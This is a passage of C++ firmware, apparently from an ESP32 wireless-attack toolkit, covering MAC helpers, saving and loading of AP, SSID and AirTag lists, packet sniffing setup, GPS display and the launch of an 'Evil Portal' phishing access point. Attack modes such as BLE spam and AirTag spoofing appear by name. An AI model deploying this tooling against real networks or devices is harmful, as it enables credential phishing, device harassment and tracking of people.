  (currentScanMode == BT_SCAN_AIRTAG) ||
  (currentScanMode == BT_SCAN_FLIPPER) ||
  (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
  (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
  (currentScanMode == BT_ATTACK_SPAM_ALL) ||
  (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
  (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
  (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
  (currentScanMode == BT_SPOOF_AIRTAG) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
  (currentScanMode == BT_SCAN_SKIMMERS))
  {
    #ifdef HAS_BT
      this->shutdownBLE();
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.display_buffer->clear();
    #ifdef SCREEN_BUFFER
      display_obj.screen_buffer->clear();
    #endif
    //Serial.print("display_buffer->size(): ");
    Serial.println(display_obj.display_buffer->size());
  
    display_obj.tteBar = false;
  #endif

  #ifdef HAS_GPS
    gps_obj.disable_queue();
  #endif
}

String WiFiScan::getStaMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

String WiFiScan::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiScan::mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  //Return true if 2 mac_addr structs are equal.
  for (int y = 0; y < 6 ; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

bool WiFiScan::seen_mac(unsigned char* mac) {
  //Return true if this MAC address is in the recently seen array.

  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  for (int x = 0; x < mac_history_len; x++) {
    if (this->mac_cmp(tmp, this->mac_history[x])) {
      return true;
    }
  }
  return false;
}

void WiFiScan::save_mac(unsigned char* mac) {
  //Save a MAC address into the recently seen array.
  if (this->mac_history_cursor >= mac_history_len) {
    this->mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  this->mac_history[this->mac_history_cursor] = tmp;
  this->mac_history_cursor++;
}

String WiFiScan::security_int_to_string(int security_type) {
  //Provide a security type int from WiFi.encryptionType(i) to convert it to a String which Wigle CSV expects.
  String authtype = "";

  switch (security_type) {
    case WIFI_AUTH_OPEN:
      authtype = "[OPEN]";
      break;
  
    case WIFI_AUTH_WEP:
      authtype = "[WEP]";
      break;
  
    case WIFI_AUTH_WPA_PSK:
      authtype = "[WPA_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_PSK:
      authtype = "[WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA_WPA2_PSK:
      authtype = "[WPA_WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_ENTERPRISE:
      authtype = "[WPA2]";
      break;

    //Requires at least v2.0.0 of https://github.com/espressif/arduino-esp32/
    case WIFI_AUTH_WPA3_PSK:
      authtype = "[WPA3_PSK]";
      break;

    case WIFI_AUTH_WPA2_WPA3_PSK:
      authtype = "[WPA2_WPA3_PSK]";
      break;

    case WIFI_AUTH_WAPI_PSK:
      authtype = "[WAPI_PSK]";
      break;
        
    default:
      authtype = "[UNDEFINED]";
  }

  return authtype;
}

void WiFiScan::clearMacHistory() {
    for (int i = 0; i < mac_history_len; ++i) {
        memset(this->mac_history[i].bytes, 0, sizeof(mac_history[i].bytes));
    }
}

String WiFiScan::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  this->free_ram = String(esp_get_free_heap_size());
  return String(s);
}

void WiFiScan::startPcap(String file_name) {
  buffer_obj.pcapOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::startLog(String file_name) {
  buffer_obj.logOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::parseBSSID(const char* bssidStr, uint8_t* bssid) {
  sscanf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
         &bssid[0], &bssid[1], &bssid[2],
         &bssid[3], &bssid[4], &bssid[5]);
}

void WiFiScan::RunLoadATList() {
  #ifdef HAS_SD
    // Prepare to access the file
    File file = sd_obj.getFile("/Airtags_0.log");
    if (!file) {
      Serial.println("Could not open /Airtags_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /Airtags_0.log");
      #endif
      return;
    }

    // Prepare JSON
    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AirTag at;
      at.mac = obj["mac"].as<String>();
      at.payloadSize = obj["payload_size"];
      at.payload = hexStringToByteArray(obj["payload"].as<String>());
      at.selected = false;
      airtags->add(at);
    }

    file.close();

    //doc.clear();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded Airtags: ");
      display_obj.tft.println((String)airtags->size());
    #endif
    Serial.print("Loaded Airtags:");
    Serial.println((String)airtags->size());
  #endif
}

void WiFiScan::RunSaveATList(bool save_as) {
  if (save_as) {
    #ifdef HAS_SD
      sd_obj.removeFile("/Airtags_0.log");
    #endif
    this->startLog("Airtags");

    DynamicJsonDocument jsonDocument(2048);

    JsonArray jsonArray = jsonDocument.to<JsonArray>();
    
    for (int i = 0; i < airtags->size(); i++) {
      const AirTag& at = airtags->get(i);
      JsonObject jsonAt = jsonArray.createNestedObject();
      jsonAt["mac"] = at.mac;
      jsonAt["payload"] = byteArrayToHexString(at.payload);
      jsonAt["payload_size"] = at.payloadSize;
    }

    String jsonString;
    serializeJson(jsonArray, jsonString);

    buffer_obj.append(jsonString);

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Saved Airtags: ");
      display_obj.tft.println((String)airtags->size());
    #endif
    Serial.print("Saved Airtags:");
    Serial.println((String)airtags->size());
  }
}

void WiFiScan::RunLoadAPList() {
  #ifdef HAS_SD
    File file = sd_obj.getFile("/APs_0.log");
    if (!file) {
      Serial.println("Could not open /APs_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /APs_0.log");
      #endif
      return;
    }

    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AccessPoint ap;
      ap.essid = obj["essid"].as<String>();
      ap.channel = obj["channel"];
      ap.selected = false;
      parseBSSID(obj["bssid"], ap.bssid);
      ap.stations = new LinkedList<uint8_t>();
      access_points->add(ap);
    }

    file.close();

    //doc.clear();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded APs: ");
      display_obj.tft.println((String)access_points->size());
    #endif
    Serial.print("Loaded APs:");
    Serial.println((String)access_points->size());
  #endif
}

void WiFiScan::RunSaveAPList(bool save_as) {
  if (save_as) {
    #ifdef HAS_SD
      sd_obj.removeFile("/APs_0.log");
    #endif
    this->startLog("APs");

    DynamicJsonDocument jsonDocument(2048);

    JsonArray jsonArray = jsonDocument.to<JsonArray>();
    
    for (int i = 0; i < access_points->size(); i++) {
      const AccessPoint& ap = access_points->get(i);
      JsonObject jsonAp = jsonArray.createNestedObject();
      jsonAp["essid"] = ap.essid;
      jsonAp["channel"] = ap.channel;

      char bssidStr[18];
      sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
              ap.bssid[0], ap.bssid[1], ap.bssid[2],
              ap.bssid[3], ap.bssid[4], ap.bssid[5]);
      jsonAp["bssid"] = bssidStr;
    }

    String jsonString;
    serializeJson(jsonArray, jsonString);

    buffer_obj.append(jsonString);

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Saved APs: ");
      display_obj.tft.println((String)access_points->size());
    #endif
    Serial.print("Saved APs:");
    Serial.println((String)access_points->size());
  }
}

void WiFiScan::RunLoadSSIDList() {
  #ifdef HAS_SD
    File log_file = sd_obj.getFile("/SSIDs_0.log");
    if (!log_file) {
      Serial.println("Could not open /SSIDs_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /SSIDs_0.log");
      #endif
      return;
    }
    while (log_file.available()) {
      String line = log_file.readStringUntil('\n'); // Read until newline character
      this->addSSID(line);
    }

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded SSIDs: ");
      display_obj.tft.println((String)ssids->size());
    #endif

    log_file.close();

    Serial.print("Loaded SSIDs: ");
    Serial.println((String)ssids->size());
  #endif
}

void WiFiScan::RunSaveSSIDList(bool save_as) {
  if (save_as) {
    #ifdef HAS_SD
      sd_obj.removeFile("/SSIDs_0.log");
    #endif
    this->startLog("SSIDs");

    for (int i = 0; i < ssids->size(); i++) {
      if (i < ssids->size() - 1)
        buffer_obj.append(ssids->get(i).essid + "\n");
      else
        buffer_obj.append(ssids->get(i).essid);
    }

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Saved SSIDs: ");
      display_obj.tft.println((String)ssids->size());
    #endif
    Serial.print("Saved SSIDs: ");
    Serial.println((String)ssids->size());
  }
}

void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
{
  startLog("evil_portal");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(" Evil Portal ",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  evil_portal_obj.begin(ssids, access_points);
  //if (!evil_portal_obj.begin(ssids, access_points)) {
  //  Serial.println("Could not successfully start EvilPortal. Setting WIFI_SCAN_OFF...");
  //  this->StartScan(WIFI_SCAN_OFF, TFT_MAGENTA);
  //  return;
  //}
  //else
  //  Serial.println("Setup EvilPortal. Current mode: " + this->currentScanMode);
  this->wifi_initialized = true;
  initTime = millis();
}

// Function to start running a beacon scan
void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("ap");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  Serial.println(text_table4[9] + (String)access_points->size());
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[44],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  delete access_points;
  access_points = new LinkedList<AccessPoint>();

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  //if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
  //else
  //  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

#ifdef HAS_SCREEN
  void WiFiScan::RunLvJoinWiFi(uint8_t scan_mode, uint16_t color) {
  
    display_obj.tft.init();
    display_obj.tft.setRotation(1);
    
    #ifdef TFT_SHIELD
      uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
      Serial.println("Using TFT Shield");
    #else if defined(TFT_DIY)
      uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
      Serial.println("Using TFT DIY");
    #endif
    #ifdef HAS_ILI9341
      display_obj.tft.setTouch(calData);
    #endif
    
  
    lv_obj_t * scr = lv_cont_create(NULL, NULL);
    lv_disp_load_scr(scr);
  
  }
#endif

void WiFiScan::RunClearStations() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearStations();
  #endif
}

void WiFiScan::RunClearAPs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[9]));
    display_obj.tft.println(text_table4[10] + (String)this->clearAPs());
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearAPs();
    this->clearStations();
  #endif
}

void WiFiScan::RunClearSSIDs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[11]));
    display_obj.tft.println(text_table4[12] + (String)this->clearSSIDs());
  #else
    this->clearSSIDs();
  #endif
}

void WiFiScan::RunGenerateSSIDs(int count) {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[13]));
  
    display_obj.tft.println(text_table4[14] + (String)this->generateSSIDs());
    display_obj.tft.println(text_table4[15] + (String)ssids->size());
  #else
    this->generateSSIDs(count);
  #endif
}

/*void WiFiScan::RunShutdownBLE() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.print(F(text_table4[18]));
  #endif

  if (this->ble_initialized) {
    this->shutdownBLE();
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_GREEN);
      display_obj.tft.println(F("OK"));
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_RED);
      display_obj.tft.println(F(text17));
      display_obj.tft.println(F(text_table4[19]));
    #endif
  }
}*/

void WiFiScan::RunGPSInfo() {
  #ifdef HAS_GPS
    String text=gps_obj.getText();

    Serial.println("Refreshing GPS Data on screen...");
    #ifdef HAS_SCREEN

      // Get screen position ready
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);

      // Clean up screen first
      //display_obj.tft.fillRect(0, 0, 240, STATUS_BAR_WIDTH, STATUSBAR_COLOR);
      display_obj.tft.fillRect(0, (SCREEN_HEIGHT / 3) - 6, SCREEN_WIDTH, SCREEN_HEIGHT - ((SCREEN_HEIGHT / 3) - 6), TFT_BLACK);

      // Print the GPS data: 3
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      if (gps_obj.getFixStatus())
        display_obj.tft.println("  Good Fix: Yes");
      else
        display_obj.tft.println("  Good Fix: No");
        
      if(text != "") display_obj.tft.println("      Text: " + text);

      display_obj.tft.println("Satellites: " + gps_obj.getNumSatsString());
      display_obj.tft.println("  Accuracy: " + (String)gps_obj.getAccuracy());
      display_obj.tft.println("  Latitude: " + gps_obj.getLat());
      display_obj.tft.println(" Longitude: " + gps_obj.getLon());
      display_obj.tft.println("  Altitude: " + (String)gps_obj.getAlt());
      display_obj.tft.println("  Datetime: " + gps_obj.getDatetime());
    #endif

    // Display to serial
    Serial.println("==== GPS Data ====");
    if (gps_obj.getFixStatus())
      Serial.println("  Good Fix: Yes");
    else
      Serial.println("  Good Fix: No");
      
    if(text != "") Serial.println("      Text: " + text);

    Serial.println("Satellites: " + gps_obj.getNumSatsString());
    Serial.println("  Accuracy: " + (String)gps_obj.getAccuracy());
    Serial.println("  Latitude: " + gps_obj.getLat());
    Serial.println(" Longitude: " + gps_obj.getLon());
    Serial.println("  Altitude: " + (String)gps_obj.getAlt());
    Serial.println("  Datetime: " + gps_obj.getDatetime());
  #endif
}

void WiFiScan::RunGPSNmea() {
  #ifdef HAS_GPS
    LinkedList<nmea_sentence_t> *buffer=gps_obj.get_queue();
    bool queue_enabled=gps_obj.queue_enabled();

    String gxgga = gps_obj.generateGXgga();
    String gxrmc = gps_obj.generateGXrmc();

    if(!buffer||!queue_enabled)
      gps_obj.flush_queue();
    #ifndef HAS_SCREEN
      else
        gps_obj.flush_text();
    #else
      // Get screen position ready
      int offset=100;
      if((SCREEN_HEIGHT / 3)<offset)
        offset=SCREEN_HEIGHT/3; //for smaller screens
      if(offset<(TOP_FIXED_AREA+6))
        offset=TOP_FIXED_AREA+6; //absolute minimium
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, offset);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_GREEN);

      // Clean up screen first
      display_obj.tft.fillRect(0, offset-6, SCREEN_WIDTH, SCREEN_HEIGHT - (offset-6), TFT_BLACK);

      #ifdef GPS_NMEA_SCRNLINES
        int lines=GPS_NMEA_SCRNLINES;
      #else
        int lines=TEXT_HEIGHT;
        if(lines>((TFT_HEIGHT-offset-BOT_FIXED_AREA)/10))
          lines=(TFT_HEIGHT-offset-BOT_FIXED_AREA)/10;
      #endif

      String text=gps_obj.getText();
      if(queue_enabled){
        int queue=gps_obj.getTextQueueSize();
        if(queue>0){
          display_obj.tft.println(gps_obj.getTextQueue());
          lines-=queue; //used lines for text display
        }
        else
          if(text != ""){
            display_obj.tft.println(text);
            lines--;
          }
      }
      else
        if(text != ""){
          display_obj.tft.println(text);
          lines--;
        }

      #if GPS_NMEA_SCRNWRAP
        lines-=((gxgga.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        lines-=((gxrmc.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        display_obj.tft.setTextWrap(GPS_NMEA_SCRNWRAP);
      #else
        lines-=2; //two self-genned messages
      #endif
    #endif

    if(buffer && queue_enabled){
      int size=buffer->size();
      if(size){
        gps_obj.new_queue();
        for(int i=0;i<size;i++){
          nmea_sentence_t line=buffer->get(i);
          Serial.println(line.sentence);

          #ifdef HAS_SCREEN
            if(lines>0){
              if(line.unparsed){
                if(line.type != "" && line.type != "TXT" && line.type != "GGA" && line.type != "RMC"){
                  int length=line.sentence.length();
                  if(length){
                    #if GPS_NMEA_SCRNWRAP
                      if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines){
                    #endif
                        display_obj.tft.println(line.sentence);
                        #if GPS_NMEA_SCRNWRAP
                          lines-=((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
                        #else
                          lines--;
                        #endif
                    #if GPS_NMEA_SCRNWRAP
                      }
                    #endif
                  }
                }
              }
            }
          #endif
        }
        delete buffer;
      }
    } else {
      static String old_nmea_sentence="";
      String nmea_sentence=gps_obj.getNmeaNotimp();

      if(nmea_sentence != "" && nmea_sentence != old_nmea_sentence){
        old_nmea_sentence=nmea_sentence;
        Serial.println(nmea_sentence);
      }

      #ifdef HAS_SCREEN
        if(lines>0){
          String display_nmea_sentence=gps_obj.getNmeaNotparsed();
          int length=display_nmea_sentence.length();
          if(length)
            #if GPS_NMEA_SCRNWRAP
              if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines)
            #endif
                display_obj.tft.println(display_nmea_sentence);
        }
      #endif
    }

    #ifdef HAS_SCREEN
      display_obj.tft.println(gxgga);
      display_obj.tft.println(gxrmc);
      #if GPS_NMEA_SCRNWRAP
        display_obj.tft.setTextWrap(false);
      #endif
    #endif

    gps_obj.sendSentence(Serial, gxgga.c_str());
    gps_obj.sendSentence(Serial, gxrmc.c_str());

  #endif
}

void WiFiScan::RunInfo()
{
  String sta_mac = this->getStaMAC();
  String ap_mac = this->getApMAC();
  String free_ram = this->freeRAM();

  Serial.println(free_ram);

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
    display_obj.tft.println(text_table4[20]);
    display_obj.tft.println(text_table4[21] + display_obj.version_number);
    display_obj.tft.println("Hardware: " + (String)HARDWARE_NAME);
    display_obj.tft.println(text_table4[22] + (String)esp_get_idf_version());
  #endif

  if (this->wsl_bypass_enabled) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[23]);
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[24]);
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.tft.println(text_table4[25] + sta_mac);
    display_obj.tft.println(text_table4[26] + ap_mac);
    display_obj.tft.println(text_table4[27] + free_ram);
  #endif

  #if defined(HAS_SD)
    if (sd_obj.supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[28]);
        display_obj.tft.print(text_table4[29]);
        display_obj.tft.print(sd_obj.card_sz);
        display_obj.tft.println("MB");
      #endif
    } else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[30]);
        display_obj.tft.println(text_table4[31]);
      #endif
    }
  #endif

  #ifdef HAS_BATTERY
    battery_obj.battery_level = battery_obj.getBatteryLevel();
    if (battery_obj.i2c_supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[32]);
        display_obj.tft.println(text_table4[33] + (String)battery_obj.battery_level + "%");
      #endif
    }
    else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[34]);
      #endif
    }
  #endif
  
  //#ifdef HAS_SCREEN
  //  display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp + " C");
  //#endif
}

void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
{
  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  startPcap("packet_monitor");

  #ifdef HAS_ILI9341
    
    #ifdef HAS_SCREEN
      display_obj.tft.init();
      display_obj.tft.setRotation(1);
      display_obj.tft.fillScreen(TFT_BLACK);
    #endif
  
    #ifdef HAS_SCREEN
      #ifdef TFT_SHIELD
        uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
        Serial.println("Using TFT Shield");
      #else if defined(TFT_DIY)
        uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
        Serial.println("Using TFT DIY");
      #endif
      display_obj.tft.setTouch(calData);
    
      //display_obj.tft.setFreeFont(1);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setTextSize(1);
      display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
      display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
    
      delay(10);
    
      display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
      display_obj.tftDrawColorKey();
      display_obj.tftDrawXScaleButtons(x_scale);
      display_obj.tftDrawYScaleButtons(y_scale);
      display_obj.tftDrawChannelScaleButtons(set_channel);
      display_obj.tftDrawExitScaleButtons();
    #endif
  #else
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table1[45],120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    #endif
  #endif

  Serial.println("Running packet scan...");
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
